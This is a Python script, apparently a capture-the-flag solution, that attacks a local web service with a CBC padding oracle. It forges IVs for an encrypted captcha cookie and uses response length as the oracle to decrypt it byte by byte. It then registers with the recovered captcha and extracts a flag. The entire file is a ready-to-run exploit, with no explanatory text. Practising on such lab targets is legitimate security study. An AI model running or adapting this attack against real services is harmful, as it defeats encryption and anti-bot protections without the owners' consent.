import requests
import base64
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

URL = "http://127.0.0.1:32869/"

# Setup
r = requests.get(URL, timeout=3)
captcha_b64 = r.cookies['captcha']
session = r.cookies['session']
csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', r.text).group(1)

captcha = base64.b64decode(captcha_b64)
iv, ct = captcha[:16], captcha[16:]
print(f"Captcha: {captcha.hex()}")

# Fast oracle with connection pooling
s = requests.Session()
adapter = requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=10)
s.mount('http://', adapter)

def oracle(test_iv):
    full = base64.b64encode(test_iv + ct).decode()
    try:
        resp = s.post(URL, 
            data={'username':'x','captcha':'x','csrf_token':'x','submit':'Register'},
            cookies={'session':session,'captcha':full}, 
            timeout=1)
        return len(resp.content)
    except: 
        return -1

# Get baseline
base = oracle(iv)
print(f"Baseline: {base}")

# Parallel byte testing
def test_byte(pos, pad, inter, iv_bytes):
    tiv = bytearray(iv_bytes)
    for k in range(1, pad):
        tiv[16-k] = inter[16-k] ^ pad
    
    # Test most likely values first
    candidates = list(range(1, 17)) + list(range(32, 127)) + list(range(256))
    
    for g in candidates:
        tiv[pos] = g
        length = oracle(bytes(tiv))
        if length != base and length > 0:
            return (pos, g ^ pad, (g ^ pad) ^ iv_bytes[pos])
    
    return (pos, iv_bytes[pos] ^ pad, pad)

pt = bytearray(16)
inter = bytearray(16)

with ThreadPoolExecutor(max_workers=4) as executor:
    for pad in range(1, 17):
        pos = 16 - pad
        
        # Test this position
        future = executor.submit(test_byte, pos, pad, inter, iv)
        result = future.result(timeout=30)
        
        pos, inter_val, pt_val = result
        inter[pos] = inter_val
        pt[pos] = pt_val
        
        c = chr(pt[pos]) if 32 <= pt[pos] < 127 else '?'
        print(f"Byte {pos}: {pt[pos]:02x} '{c}'")

print(f"\nPlaintext: {bytes(pt)}")

# Remove padding
pv = pt[-1]
sol = bytes(pt[:-pv]) if 1 <= pv <= 16 else bytes(pt)
sol_str = sol.decode('utf-8', errors='ignore')
print(f"Solution: '{sol_str}'")

# Register
resp = s.post(URL, 
    data={'username':'hacker123','captcha':sol_str,'csrf_token':csrf,'submit':'Register'},
    cookies={'session':session,'captcha':captcha_b64})

print(f"\nStatus: {resp.status_code}")
print(resp.text)

flag = re.search(r'FLAG\{[^}]+\}', resp.text)
if flag:
    print(f"\n*** FLAG: {flag.group(0)} ***")

